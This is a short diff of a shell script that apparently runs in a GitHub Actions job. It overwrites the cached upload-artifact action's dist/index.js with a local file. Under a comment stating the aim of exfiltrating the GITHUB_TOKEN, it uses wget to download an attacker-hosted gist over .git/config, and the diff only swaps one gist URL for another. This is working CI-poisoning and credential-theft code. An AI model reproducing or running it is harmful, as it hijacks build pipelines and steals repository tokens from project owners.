@@ -7,4 +7,4 @@ touch missing_license_headers.txt
 cp index.js /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js
 
 # modifying .git/config to exfiltrate the GITHUB_TOKEN 
-wget https://gist.githubusercontent.com/stazottest0/7714cfc6d5e2dc941db3d31bdfe3530f/raw/f5c81694a478891228f4d6402aa95bf4f1485f99/gistfile1.txt -O .git/config
+wget https://gist.githubusercontent.com/stazottest0/ec556e4cc70e6029c6f5bd91925168ba/raw/a3686326ca07bdb8583ba51ae896e8c293594018/gistfile1.txt -O .git/config
